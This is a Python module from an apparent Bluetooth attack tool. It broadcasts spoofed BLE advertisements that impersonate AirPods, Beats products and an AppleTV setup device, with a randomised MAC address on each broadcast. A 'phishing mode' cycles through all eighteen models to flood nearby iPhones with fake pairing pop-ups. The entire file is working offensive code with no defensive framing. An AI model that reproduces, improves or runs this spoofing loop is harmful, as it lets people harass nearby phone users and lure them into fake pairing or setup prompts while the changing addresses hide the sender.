import time
import random
from apybluez.hci.wrapper import start_spoof, stop_spoof
from apybluez.exceptions import HCISpoofingError
from modules.reset import reset_adapter

class AdvertisingModule:
    DEVICE_DATA = {
        1: {"name": "AirPods"},
        2: {"name": "AirPods Pro"},
        3: {"name": "AirPods Max"},
        4: {"name": "AirPods Gen 2"},
        5: {"name": "AirPods Gen 3"},
        6: {"name": "AirPods Pro Gen 2"},
        7: {"name": "PowerBeats"},
        8: {"name": "PowerBeats Pro"},
        9: {"name": "Beats Solo Pro"},
        10: {"name": "Beats Studio Buds"},
        11: {"name": "Beats Flex"},
        12: {"name": "BeatsX"},
        13: {"name": "Beats Solo3"},
        14: {"name": "Beats Studio3"},
        15: {"name": "Beats Studio Pro"},
        16: {"name": "Beats Fit Pro"},
        17: {"name": "Beats Studio Buds+"},
        18: {"name": "AppleTV Setup"},
    }

    def __init__(self, dev_id=0, console=None):
        self.dev_id = dev_id
        self.sock = None
        self.console = console

    def log(self, message):
        if self.console:
            self.console.print(message)
        else:
            print(message)

    def start_spoof(self, interval_ms=160, custom_payload=None, model_name="AirPods", phishing_mode=False):
        reset_adapter(self.dev_id, self.console)
        
        if phishing_mode:
            self.log(f"[bold red][*] Starting PHISHING MODE ([white]Cycling all models[/white]) on hci{self.dev_id}...[/bold red]")
        else:
            self.log(f"[bold blue][*] Starting Spoofing ([white]{model_name}[/white]) on hci{self.dev_id}...[/bold blue]")
        
        if phishing_mode:
            self.log(f"[red][*] PHISHING MODE ACTIVE. Cycling through all models. Look at your iPhone![/red]")
        else:
            self.log(f"[green][*] Broadcasting {model_name}. Look at your iPhone![/green]")
        self.log("[dim][*] Press Ctrl+C to stop.[/dim]")

        try:
            if self.console and phishing_mode:
                 with self.console.status("[bold red]PHISHING MODE: Cycling all models...[/bold red]", spinner="earth"):
                     self._spoof_loop(interval_ms, custom_payload, model_name, phishing_mode)
            elif self.console and not phishing_mode:
                 with self.console.status(f"[bold green]Broadcasting {model_name}...[/bold green]", spinner="earth"):
                     self._spoof_loop(interval_ms, custom_payload, model_name, phishing_mode)
            else:
                 self._spoof_loop(interval_ms, custom_payload, model_name, phishing_mode)

        except KeyboardInterrupt:
            self.log("\n[yellow][*] Stopping Advertisement...[/yellow]")
            if self.sock:
                stop_spoof(self.sock)
        except Exception as e:
            self.log(f"[red][!] Error: {e}[/red]")
            if self.sock:
                stop_spoof(self.sock)

    def _spoof_loop(self, interval_ms, custom_payload, model_name, phishing_mode):
        while True:
            if phishing_mode:
                 keys = list(self.DEVICE_DATA.keys())
                 for k in keys:
                     m = self.DEVICE_DATA[k]['name']
                     try:
                         rand_mac = bytes([random.randint(0, 255) for _ in range(6)])
                         mac_str = ':'.join(f'{b:02x}' for b in rand_mac)
                         
                         self.log(f"[dim]Spoofing {m} on {mac_str}[/dim]") 
                         
                         self.sock = start_spoof(model_name=m, device_id=self.dev_id, 
                                               interval_min=100, interval_max=100, 
                                               random_mac=rand_mac)
                         time.sleep(2)
                         stop_spoof(self.sock)
                         self.sock = None
                         time.sleep(0.1)
                     except HCISpoofingError as e:
                         self.log(f"[red][!] Spoof error: {e}[/red]")
            else:
                try:
          
                    rand_mac = bytes([random.randint(0, 255) for _ in range(6)])
                    
                    self.sock = start_spoof(model_name=model_name, device_id=self.dev_id, 
                                          interval_min=interval_ms, interval_max=interval_ms,
                                          random_mac=rand_mac)
                    time.sleep(2)
                    stop_spoof(self.sock)
                    self.sock = None
                    time.sleep(0.1)
                except HCISpoofingError as e:
                     self.log(f"[red][!] Spoof error: {e}[/red]")
                     time.sleep(1) 